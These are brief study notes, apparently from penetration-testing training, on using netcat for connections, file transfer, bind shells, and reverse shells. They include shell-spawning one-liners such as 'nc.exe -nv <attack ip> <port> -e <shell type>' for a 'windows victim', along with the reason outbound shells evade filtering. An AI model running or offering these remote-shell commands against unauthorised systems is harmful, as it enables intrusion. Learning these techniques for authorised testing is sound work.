![](</Images/Pasted image 20240111191515.png>)

Client Mode: connecting to hosts/ports

netcat for window stored in Kali @ `/usr/share/windows-binaries/nc.exe`

Listener: `nc -nvlp 1245`
(Client) Connect to listener: `nc.exe -nv <ip> <port>`

### transfer files with nc
Listener will receive. Transfer done with < and > (post / recieve)

ex. from Linux to Windows
**linux**
`nc -np <ip> 1234 < test.txt`

**windows - download**
`nc.exe -nvlp 1234 > test.txt`

### bind shells
#bindshells

![](</Images/Pasted image 20240111203700.png>)

Example using above diagram set to run cmd.exe

**windows - listener**
`nc.exe -nvlp 1234 -e cmd.exe'
> if going the other direction to get linux shell need -c instead of -e

**linux - client**
`nc -nv <ip> <port>`


### reverse shells
#reverseshell

![](</Images/Pasted image 20240112193844.png>)
Preferred over bind shell mainly due to outgoing traffic not being blocked from leaving machine and IP doesn't need to be put on victim machine

**windows victim**
Transfer nc.exe first
`nc.exe -nv < attack ip> <port> -e <shell type>` since on windows cmd.exe where linux is /bin/bash

**linux attack**
set up listener with `nc -lvnp 1234`

